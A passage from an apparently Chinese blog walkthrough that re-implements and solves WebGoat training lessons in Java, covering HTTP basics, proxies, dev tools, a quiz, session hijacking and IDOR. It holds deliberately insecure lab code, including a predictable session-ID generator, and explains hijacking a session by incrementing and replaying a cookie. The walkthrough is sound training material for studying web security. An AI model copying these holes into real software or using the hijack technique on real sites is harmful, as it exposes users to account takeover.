            return success(this).build();
        }else {
            if (!"POST".equalsIgnoreCase(answer)){
                return failed(this).feedback("http-basics.incorrect").build();
            }
            if (!magic_answer.equals(magic_num)){
                return failed(this).feedback("http-basics.magic").build();
            }
        }
        return failed(this).build();
    }
}
```

这里AssignmentPath 并没有去使用 推测可能是webgoat没有写完

![image-20220825180659450](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825180659450.png)

这里可能需要去抓包 先去看一下请求方式和 magic number

![image-20220825180917463](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825180917463.png)

![image-20220825180911483](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825180911483.png)

或者直接观察前端代码

![image-20220825181029995](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825181029995.png)

![image-20220825181103415](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825181103415.png)

## http_proxies

### HttpProxies

```java
package com.wanan.webgoat.lessons.http_proxies;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class HttpProxies extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.GENERAL;
    }

    @Override
    public String getTitle() {
        return "2.http-proxies.title";
    }
}
```

### HttpBasicsInterceptRequest

```java
package com.wanan.webgoat.lessons.http_proxies;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.http.HttpMethod;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

@RestController
public class HttpBasicsInterceptRequest extends AssignmentEndpoint {
    @RequestMapping(path = "/HttpProxies/intercept-request",method = {RequestMethod.POST,RequestMethod.GET})
    @ResponseBody
    public AttackResult completed(@RequestHeader(value = "x-request-intercepted",required = false)Boolean headerValue, @RequestParam(value = "changeMe",required = false) String paramValue, HttpServletRequest request){
//        获取请求头中的x-request-intercepted required = false表示可以有也可以没有
//        将请求参数中的changeMe 绑定为paramValue
        if (HttpMethod.POST.matches(request.getMethod())){
//            如果请求是post就失败
            return failed(this).feedback("http-proxies.intercept.failure").build();
        }
        if (headerValue != null && paramValue != null && headerValue && "Requests are tampered easily".equalsIgnoreCase(paramValue)){
//            如果headerValue 不为空 paramValue 不为空 headerValue为true 并且paramValue与字符串相等
            return success(this).feedback("http-proxies.intercept.success").build();
        }else {
            return failed(this).feedback("http-proxies.intercept.failure").build();
        }


    }
}
```

完成题目 主要是教会你抓包并修改请求包

![image-20220825185451367](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825185451367.png)

![image-20220825190444738](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825190444738.png)

![image-20220825190909702](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825190909702.png)

## chrome_dev_tools

### ChromeDevTools

```java
package com.wanan.webgoat.lessons.chrome_dev_tools;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class ChromeDevTools extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.GENERAL;
    }

    @Override
    public String getTitle() {
        return "3.chrome-dev-tools.title";
    }
}
```

## chrome_dev_tools

### NetworkDummy

```java
package com.wanan.webgoat.lessons.chrome_dev_tools;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class NetworkDummy extends AssignmentEndpoint {
    @PostMapping("/ChromeDevTools/dummy")
    @ResponseBody
    public AttackResult completed(@RequestParam String successMessage){
//        获取successMessage参数
        UserSessionData userSessionData = getUserSessionData();
//        这里我们去看 UserSessionData在哪里赋值的
        String answer = (String) userSessionData.getValue("randValue");
        if (successMessage != null && successMessage.equals(answer)){
            return success(this).feedback("xss-dom-message-success").build();
        }else {
            return failed(this).feedback("xss-dom-message-failure").build();
        }
    }
}
```

![image-20220825202707349](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825202707349.png)

![image-20220825204113787](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825204113787.png)

![image-20220825204311496](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825204311496.png)

那么暂时情况下我们没有找到给userSessionData.Value("randValue")赋值的地方 这里我们首先去查找一下哪里调用了这个setValue 

![image-20220825212624529](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825212624529.png)

很明显这里其实暂时仅仅有一个地方调用了 那么现在读下来其实我们这道题目是无法去做的 因此我选择去看前端的题目要求

可以简单的理解一下就是像让我们去通过console去调用这个js方法 这里找了半天才找到这个js文件

![image-20220825210117176](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825210117176.png)

尝试去调用的时候也是很明显的出现了问题那么我们现在需要去做的是看看哪里有关于这个路径的信息

![image-20220825212829615](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825212829615.png)

这里在xss关卡其实有调用

![image-20220825212931962](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825212931962.png)

因此这里选择去先写这个文件

#### xss

##### DOMCrossSiteScripting

```java
package com.wanan.webgoat.lessons.xss;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.security.SecureRandom;

@RestController
public class DOMCrossSiteScripting extends AssignmentEndpoint {
    @PostMapping("/CrossSiteScripting/phone-home-xss")
    @ResponseBody
    public AttackResult completed(@RequestParam Integer param1, @RequestParam Integer param2, HttpServletRequest request){
        UserSessionData userSessionData = getUserSessionData();
        SecureRandom number = new SecureRandom();
        //        new 一个生成随机数的对象
        userSessionData.setValue("randValue",String.valueOf(number.nextInt()));
//        生成一个随机数并给randValue赋值
        if (param1 == 42 && param2 == 24 && request.getHeader("webgoat-requested-by").equals("dom-xss-vuln")){
            return success(this).output("phoneHome Response is " + userSessionData.getValue("randValue").toString()).build();
        }else {
            return failed(this).build();
        }
    }
}
```

![image-20220825221701018](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825221701018.png)

由于在上面进行了对比successMessage.equals(answer)

所以这里的phoneHome需要我们提交进去就可以过关

![image-20220825221928248](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825221928248.png)

这里过关之后我会删除xss/DOMCrossSiteScripting.java

### NetworkLesson

```java
package com.wanan.webgoat.lessons.chrome_dev_tools;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"networkHint1","networkHint2"})
public class NetworkLesson extends AssignmentEndpoint {
    @PostMapping(value = "/ChromeDevTools/network",params = {"network_num","number"})
    @ResponseBody
    public AttackResult completed(@RequestParam String network_num,@RequestParam String number){
        if (network_num.equals(number)){
//            这里主要是判断输入的两个值是否相同
            return success(this).feedback("network.success").output("").build();
        }else {
            return failed(this).feedback("network.failed").build();
        }
    }

    @PostMapping(path = "/ChromeDevTools/network",params = "networkNum")
    @ResponseBody
    public ResponseEntity<?> ok(@RequestParam String networkNum){
        return ResponseEntity.ok().build();
    }
}

```

![image-20220825230036188](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825230036188.png)

根据network去查看一下向 ChromeDevTools/network 发送的payload

![image-20220825230129245](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825230129245.png)

输入即可过关

![image-20220825230236518](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825230236518.png)

当然也可通过check抓取值

![image-20220825230325870](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825230325870.png)

## cia

### CIA

```java
package com.wanan.webgoat.lessons.cia;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class CIA extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.GENERAL;
    }

    @Override
    public String getTitle() {
        return "4.cia.title";
    }
}
```

### CIAQuiz

```java
package com.wanan.webgoat.lessons.cia;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.*;

@RestController
public class CIAQuiz extends AssignmentEndpoint {
    String[] solutions = {"Solution 3","Solution 1","Solution 4", "Solution 2"};
    boolean[] guesses = new boolean[solutions.length];

    @PostMapping("/cia/quiz")
    @ResponseBody
    public AttackResult completed(@RequestParam String[] question_0_solution,@RequestParam String[] question_1_solution,@RequestParam String[] question_2_solution,@RequestParam String [] question_3_solution){
//        这里可见请求参数这里其实是使用的String [] 数组,那么当我们传入多个相同参数的时候就会全部获取存放到数组之中
        int correctAnswers =0 ;

        String[] givenAnswers = {question_0_solution[0],question_1_solution[0],question_2_solution[0],question_3_solution[0]};
//        获取每个参数中个的第一个值 并存放到givenAnswers中去

        for (int i = 0; i < solutions.length;i++){
            if (givenAnswers[i].contains(solutions[i])){
//                如果第一个参数中包含 Solution 3
                correctAnswers++;
//                正确答案的数量加1
                guesses[i] = true;
//                就猜对了
            }else {
                guesses[i] = false;
            }
        }
        if (correctAnswers == solutions.length){
            return success(this).build();
        }else {
            return failed(this).build();
        }
    }
    @GetMapping("/cia/quiz")
    @ResponseBody
    public boolean[] getResults(){
//        返回这个guesses数组
        return this.guesses;
    }
}
```

这里也比较简单 看下发送的 请求 可以发现当提交了答案之后会立马去get请求一次答案

![image-20220827122239088](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827122239088.png)

第一种过关方法就是一个个试去找正确答案

![image-20220827122334897](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827122334897.png)

另一种方式就是根据检查答案的方式 既然答案检查的是是否包含这个字段,那么我们只要把字段全部包含就可了

![image-20220827122624570](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827122624570.png)

但是呢实际这样写并不会通过,我们来看看可以发现这里的请求参数默认以,进行了分割,导致并没有取到值

![image-20220827122843143](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827122843143.png)

这样写即可完成

![image-20220827123050738](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827123050738.png)

## lesson_template

### LessonTemplate

```java
package com.wanan.webgoat.lessons.lesson_template;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class LessonTemplate extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.GENERAL;
    }

    @Override
    public String getTitle() {
        return "lesson-template.title";
    }
}
```

### SampleAttack

```java
package com.wanan.webgoat.lessons.lesson_template;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import lombok.AllArgsConstructor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import java.util.List;

@RestController
@AssignmentHints({"lesson-template.hints.1","lesson-template.hints.2","lesson-template.hints.3"})
public class SampleAttack extends AssignmentEndpoint {
    String secretValue = "secr37Value";

    @Autowired
    UserSessionData userSessionData;
    @PostMapping("/lesson-template/sample-attack")
    @ResponseBody
    public AttackResult completed(@RequestParam("param1")String param1,@RequestParam("param2")String param2){
        if (userSessionData.getValue("some-value") != null){

        }
        if (secretValue.equals(param1)){
            return success(this)
                    .output("Custom Output ...if you want, for success")
                    .feedback("lesson-template.sample-attack.success")
                    .build();
        }

        return failed(this).feedback("lesson-template.sample-attack.failure-2")
                .output("Custom output for this failure scenario, usually html that will get rendered directly ... yes, you can self-xss if you want")
                .build();
    }

    @GetMapping("/lesson-template/shop/{user}")
    @ResponseBody
    public List<Item> getItemsInBasket(@PathVariable("user")String user){
        return List.of(new Item("WG-1","WebGoat promo",12.8),new Item("WG-2","webGoat sticker",0.00));
    }
    @AllArgsConstructor
    private class Item{
        private String number;
        private String description;
        private double price;
    }
}
```

这一关其实就是教我们如何自己去出题目的,那么其实这里就是样例

![image-20220827133344581](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827133344581.png)

简单通过阅读代码发现只要第一个参数与密钥相同就可过关

## hijacksession

### HijackSession

```java
package com.wanan.webgoat.lessons.hijacksession;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class HijackSession extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A1;
    }

    @Override
    public String getTitle() {
        return "hijacksession.title";
    }
}
```

### HijackSessionAssignment

这里说明一下这里的顺序其实是代表着书写的顺序 如果需要去阅读的话建议从后向前读更好理解 或者先写一遍 然后理解

```java
package com.wanan.webgoat.lessons.hijacksession;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.lessons.hijacksession.cas.Authentication;
import com.wanan.webgoat.lessons.hijacksession.cas.HijackSessionAuthenticationProvider;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;

@RestController
@AssignmentHints({
        "hijacksession.hints.1",
        "hijacksession.hints.2",
        "hijacksession.hints.3",
        "hijacksession.hints.4",
        "hijacksession.hints.5",

})
public class HijackSessionAssignment extends AssignmentEndpoint {
    private static final String COOKIE_NAME = "hijack_cookie";
    @Autowired
    HijackSessionAuthenticationProvider provider;
//    这里自动注入了

    @PostMapping(path = "/HijackSession/login")
    @ResponseBody
    public AttackResult login(@RequestParam String username, @RequestParam String password,
                              @CookieValue(value = COOKIE_NAME,required = false) String cookieValue,
                              HttpServletResponse response){
        Authentication authentication;
//        定义authentication对象
        if (StringUtils.isEmpty(cookieValue)){
//            如果cookieValue是空的
            authentication = provider.authenticate(Authentication.builder().name(username).credentials(password).build());
            setCookie(response,authentication.getId());

        }else {
            authentication = provider.authenticate(Authentication.builder().id(cookieValue).build());
        }
        if (authentication.isAuthenticated()){
//            如果已经认证了
            return success(this).build();
        }
        return failed(this).build();
    }

    private void setCookie(HttpServletResponse response,String cookieValue){
        Cookie cookie = new Cookie(COOKIE_NAME,cookieValue);
        cookie.setPath("/WebGoat");
        cookie.setSecure(true);
        response.addCookie(cookie);
    }

}

```

### cas

#### HijackSessionAuthenticationProvider

```java
package com.wanan.webgoat.lessons.hijacksession.cas;



import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Component;
import org.springframework.web.context.annotation.ApplicationScope;

import java.time.Instant;
import java.util.LinkedList;
import java.util.Queue;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;
import java.util.function.DoublePredicate;
import java.util.function.Supplier;

@ApplicationScope
//没太读懂 这里是指这个类与@Bean类注解的相似 但是会将作用域放到SCOPE_APPLICATION里面?
//我理解就是用springboot自动去加载管理只不过作用域不同
@Component
public class HijackSessionAuthenticationProvider implements AuthenticationProvider<Authentication> {
//    这里也很简单就可以理解 首先实现的是AuthenticationProvider 而这里的Authentication 就相当于实参去传递给了T
    private Queue<String> sessions = new LinkedList<>();
//    用于在处理之前保存元素的集合
    private static long id = new Random().nextLong() & Long.MAX_VALUE;
//    这里其实不太能理解 前面是生成一个long类型的随机数 这个 & 是什么意思 表表示最大是 Long.MAX_VALUE?
    protected static final int MAX_SESSIONS = 50 ;
//    这里其实是作为session 最大值的一个定义


    private static final DoublePredicate PROBABILITY_DOUBLE_PREDICATE = pr -> pr < 0.75;
//
    private static final Supplier<String> GENERATE_SESSION_ID = () -> ++id + "-" + Instant.now().toEpochMilli();
//    这里简单理解就是 id先自加一 再拼接起当前时间戳
    public static final Supplier<Authentication> AUTHENTICATION_SUPPLIER = () -> Authentication
            .builder()
            .id(GENERATE_SESSION_ID.get())
//        get()获取结果的提供者 就是获取Authentication创建的时间
            .build();

    @Override
    public Authentication authenticate(Authentication authentication) {
//        进行认证
        if (authentication == null){
//            如果没有authentication 则返回一个
            return AUTHENTICATION_SUPPLIER.get();
        }
        if (StringUtils.isNotEmpty(authentication.getId()) && sessions.contains(authentication.getId())) {
//      如果id不是空 并且 sessions 包含id
            authentication.setAuthenticated(true);
//            认证成功
            return authentication;
        }
        if (StringUtils.isEmpty(authentication.getId())){
//            如果id是空
            authentication.setId(GENERATE_SESSION_ID.get());
//            救赋值
        }
        authorizedUserAutoLogin();
//        认证的用户自动登录
        return authentication;
    }

    protected void  authorizedUserAutoLogin(){
        if (!PROBABILITY_DOUBLE_PREDICATE.test(ThreadLocalRandom.current().nextDouble())){
//            生成一个随机 数判断与 0.75 大小   如果大于0.75
            Authentication authentication = AUTHENTICATION_SUPPLIER.get();
            authentication.setAuthenticated(true);
//            设置成已认证
            addSession(authentication.getId());
//            添加一个session  为id
        }
    }
    protected boolean addSession(String sessionId) {
        if (sessions.size() >= MAX_SESSIONS) {
            sessions.remove();
        }
        return sessions.add(sessionId);
    }
    protected int getSessionsSize(){
        return sessions.size();
    }
}

```

#### Authentication

```java
package com.wanan.webgoat.lessons.hijacksession.cas;

import lombok.Builder;
import lombok.Getter;
import lombok.ToString;

import java.security.Principal;

@Getter
@ToString
public class Authentication implements Principal {
//    这里很明显继承了 Principal 那么应该是 AuthenticationProvider中的 T参数了
    private boolean authenticated = false;
    private String name;
    private Object credentials;
    private String id;

    @Builder
//    可进行链式赋值
    public Authentication(boolean authenticated, String name, Object credentials, String id) {
        this.name = name;
        this.credentials = credentials;
        this.id = id;
    }

    @Override
    public String getName() {
        return name;
    }
    protected  void setAuthenticated(boolean authenticated){
        this.authenticated = authenticated;
    }
    protected void setId(String id){
        this.id = id;
    }
}

```

#### AuthenticationProvider

```java
package com.wanan.webgoat.lessons.hijacksession.cas;

import java.security.Principal;

@FunctionalInterface
//简单来说就是这个是标记是否符合接口的定义 这个接口必须只有一个抽象方法 目的是为了方便Lambda表达式
public interface AuthenticationProvider <T extends Principal >{
//    这里其实不太能理解 推测并不是代表这个类去继承Principal 而是代表的这个T 参数是继承于Principal 但是写在了类上面造成了误解
//    其实可以把这里的T 理解成形参 实参在HijackSessionAuthenticationProvider传入
    T authenticate(T t);
//    那么这里自然这个 t 参数类型就是代表着 必须继承自Principal
}

```

简单分析一下

![image-20220827203154209](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827203154209.png)

当第一次请求的时候cookie其实是空的

![image-20220827203533200](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827203533200.png)

先创建一个username 和 passwd 的authentication

![image-20220827203719088](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827203719088.png)

这里两个false  直接跳到下一个if里面 

![image-20220828133534770](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828133534770.png)

调用的 GENERATE_SESSION_ID 去获取一个id 

![image-20220828133632268](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828133632268.png)

这里的id 首先是一个静态的值 紧接着去自加一 与 当前时间戳进行拼接

![image-20220828134048342](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134048342.png)

这里需要注意的是 这里的 authentication 是这个 @23160 还有这个id 最后是657

紧接着跳到了authorizedUserAutoLogin()中去

![image-20220827203818440](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827203818440.png)

仔细看着一行 其实 这里是有一定概率才能进到这个if中的,原因就是这里的 数字是随机生成的 进入if的概率呢就是 0.25

因此我们在if里面下个断点然后不断重复请求进入if看看先

![image-20220828134226576](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134226576.png)

进来以后发现创建了一个 使用的是 AUTHENTICATION_SUPPLIER.get()创建了一个新的authentication 

![image-20220828133124860](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828133124860.png)

因此就调到了这里面这里很明显示构建一个Authentication 但是这里的 id 其实是调用的 GENERATE_SESSION_ID 首先这里进行了id的自加一 

![image-20220828133255565](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828133255565.png)

这里的id其实是静态的 因此 先自加后拼接当前时间戳

![image-20220828134226576](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134226576.png)

仔细看这里的 @23164 与 id 最后是236 这里其实出现了不同 那是由于我们下了断点导致执行时间出现了较大差异 假设我们不下断点的话 这两个值应该是相同的 我们可以做个简单的测试 后面会讲到

并将Authenticated赋值成了 true 

![image-20220828134536803](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134536803.png)

接着进行了addSession操作 将当前的 authentication.getId() 进行了存入

但是这里还需要注意的是如果sessions 的数量大于50 就会移除

![image-20220828134625719](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134625719.png)

接着返回了

![image-20220828134710287](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134710287.png)

回来之后的authentication是我们第一次的 @23160

![image-20220828102713506](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828102713506.png)

接着将这里的setcookie

![image-20220828134809977](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134809977.png)

可以发现当cookie是空的时候会给请求设置一个cookie

![image-20220828102747572](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828102747572.png)

从这里我们也可以测试一下设置cookie的规律

我们只在return 这里下一个断点 

![image-20220828135240545](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828135240545.png)

不断请求到截断到为止 这里发现后缀是235

![image-20220828135408612](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828135408612.png)

![image-20220828135442335](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828135442335.png)

放行之后发现这里的后面时间戳其实是相同的 而只有前面由于自加一出现了差异

接着我们给cookie添加上去

![image-20220827204845082](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827204845082.png)

这里由于sessions 中没有包含我们的cookie 因此两个都是false

![image-20220827205205113](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827205205113.png)

这里当然也能进来 不过这次生成的cookie并不会返回到页面上面

![image-20220828135916911](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828135916911.png)

![image-20220828140003139](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828140003139.png)

![image-20220828140028337](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828140028337.png)

到现在我们的思路就是先 使用 不带cookie的去请求获取得到的cookie 接着将得到的cookie 进行+1操作 因为实际存入到sessions中的其实是+过1的 接着使用这个cookie去请求

![image-20220828140933908](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828140933908.png)

![image-20220828140941870](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828140941870.png)

## idor

### IDOR

```java
package com.wanan.webgoat.lessons.idor;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class IDOR extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A1;
    }

    @Override
    public String getTitle() {
        return "idor.title";
    }
}

```

### IDORLogin

```java
package com.wanan.webgoat.lessons.idor;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.Map;

@RestController
@AssignmentHints({"idor.hints.idor_login"})
public class IDORLogin extends AssignmentEndpoint {
    private Map<String,Map<String,String >> idorUserInfo = new HashMap<>();
//    外面map用来存储用户  内部的map 用来存储用户的信息
    public void initIDORInfo(){
        idorUserInfo.put("tom",new HashMap<String, String>());
        idorUserInfo.get("tom").put("password","cat");
        idorUserInfo.get("tom").put("id","2342384");
        idorUserInfo.get("tom").put("color","yellow");
        idorUserInfo.get("tom").put("size","small");

        idorUserInfo.put("bill",new HashMap<String, String>());
        idorUserInfo.get("bill").put("password","buffalo");
        idorUserInfo.get("bill").put("id","2342388");
        idorUserInfo.get("bill").put("color","brown");
        idorUserInfo.get("bill").put("size","large");

    }

    @PostMapping("/IDOR/login")
    @ResponseBody
    public AttackResult completed(@RequestParam String username,@RequestParam String password){
        initIDORInfo();
//        先进行用户的初始化
        UserSessionData userSessionData = getUserSessionData();
        if (idorUserInfo.containsKey(username)){
//            如果idorUserInfo包含这个用户
            if ("tom".equals(username) && idorUserInfo.get("tom").get("password").equals(password)){
                userSessionData.setValue("idor-authenticated-as",username);
                userSessionData.setValue("idor-authenticated-user-id",idorUserInfo.get(username).get("id"));
                return success(this).feedback("idor.login.success").feedbackArgs(username).build();
            }else {
                return failed(this).feedback("idor.login.failure").build();
            }
        }else {
            return failed(this).feedback("idor.login.failure").build();
        }
    }
}
```

先看下UserSessionData

![image-20220828154959520](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828154959520.png)

这里也比较简单就是 一个map的简单功能

![image-20220828155228978](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828155228978.png)

这里只要登录就可过关了

![image-20220828155303545](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828155303545.png)

### IDORDiffAttributes

```java
package com.wanan.webgoat.lessons.idor;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.*;

@RestController
@AssignmentHints({"idor.hints.idorDiffAttributes1","idor.hints.idorDiffAttributes2","idor.hints.idorDiffAttributes3"})
public class IDORDiffAttributes extends AssignmentEndpoint {
    @PostMapping("/IDOR/diff-attributes")
    @ResponseBody
    public AttackResult completed(@RequestParam String attributes){
//        接收一个attributes参数
        attributes = attributes.trim();
//        对参数进行前后去空
        String[] diffAttribs = attributes.split(",");
//        将参数通过，进行分割成数组
        if (diffAttribs.length < 2){
//            如果数组的长度小于2 直接返回错误
            return failed(this).feedback("idor.diff.attributes.missing").build();
        }
        
        if (diffAttribs[0].toLowerCase().trim().equals("userid") && diffAttribs[1].toLowerCase().trim().equals("role") ||
        diffAttribs[1].toLowerCase().trim().equals("userid") && diffAttribs[0].toLowerCase().trim().equals("role")){
//        如果数组中第一个值先转换为小写 后去前后空格 接着与userid进行对比 对第二个进行比较如果是role 
//            简单来说就是需要前两个是userid
            return success(this).feedback("idor.diff.success").build();
        }else {
            return failed(this).feedback("idor.diff.failure").build();
        }
    }
}

```

这里写完之后第二关是无法去通过的,因此我们需要接着写

### IDORViewOwnProfile

```java
package com.wanan.webgoat.lessons.idor;

import com.wanan.webgoat.container.session.UserSessionData;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.Map;

@RestController
@Slf4j
public class IDORViewOwnProfile {
    @Autowired
    UserSessionData userSessionData;
//    这里就是我们之间的全局变量 userSessionData

    @GetMapping(path = {"/IDOR/own","/IDOR/profile"},produces = {"application/json"})
//    这里很明显示产生了一个json的数据返回回去的
    @ResponseBody
    public Map<String,Object> invoke(){
        Map<String,Object> details =  new HashMap<>();
        try {
            if (userSessionData.getValue("idor-authenticated-as").equals("tom")){
//                如果这里已经登录的对象里存在tom
                String authUserId  = (String) userSessionData.getValue("idor-authenticated-user-id");
//                就取出这个id来
                UserProfile userProfile =  new UserProfile(authUserId);
//                通过这个id 去创建一个UserProfile 这个类是一个数据类
                details.put("userId",userProfile.getUserId());
                details.put("name",userProfile.getName());
                details.put("color",userProfile.getColor());
                details.put("size",userProfile.getSize());
                details.put("role",userProfile.getRole());
//                在详情里放入这些值 然后返回回去
            }else {
                details.put("error","You do not have privileges to view the profile. Authenticate as tom first please.");
            }
        }catch (Exception ex){
            log.error("something went wrong",ex.getMessage());
        }
        return details;
    }
}

```

### UserProfile

```java
package com.wanan.webgoat.lessons.idor;

import java.util.HashMap;
import java.util.Map;

public class UserProfile {
    private String userId;
    private String name;
    private String color;
    private String size;
    private boolean isAdmin;
    private int role;

    public UserProfile(){
    }

    public UserProfile(String id){
        setProfileFromId(id);
    }
//    这里的构造函数是仅仅提供了一个id去创建
    private void setProfileFromId(String id){
        if (id.equals("2342384")){
            this.userId = id;
            this.color = "yellow";
            this.name = "Tom Cat";
            this.size = "small";
            this.isAdmin = false;
